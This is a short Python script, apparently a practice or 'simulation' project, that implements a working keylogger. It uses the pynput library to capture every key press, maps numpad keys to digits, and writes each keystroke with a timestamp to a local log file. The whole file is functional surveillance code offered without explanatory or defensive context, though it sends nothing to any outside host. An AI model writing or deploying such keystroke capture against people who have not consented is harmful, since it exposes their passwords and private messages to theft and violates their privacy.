from pynput import keyboard
import logging
import os

def start_keylogger():
    log_dir = r"E:\Saved Games\key-logger-simulation\logs"
    os.makedirs(log_dir, exist_ok=True)

    logging.basicConfig(
        filename=os.path.join(log_dir, "key_log.txt"),
        level=logging.DEBUG,
        format="%(asctime)s: %(message)s"
    )


    numpad_vk_map = {
        96: '0',
        97: '1',
        98: '2',
        99: '3',
        100: '4',
        101: '5',
        102: '6',
        103: '7',
        104: '8',
        105: '9',
    }

    def on_press(key):
        try:
            if isinstance(key, keyboard.KeyCode):
                if key.char:
                    logging.info(f"{key.char}")
                elif key.vk in numpad_vk_map:
                    logging.info(f"{numpad_vk_map[key.vk]}")
                else:
                    logging.info(f"[Unknown KeyCode: vk={key.vk}]")
            elif isinstance(key, keyboard.Key):
                logging.info(f"[{key.name}]")
            else:
                logging.info(f"[Unknown key type: {repr(key)}]")
        except Exception as e:
            logging.error(f"Error logging key: {e}")

    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("[!] Keylogger manually stopped.")
    except Exception as e:
        logging.error(f"Error in keylogger: {e}")





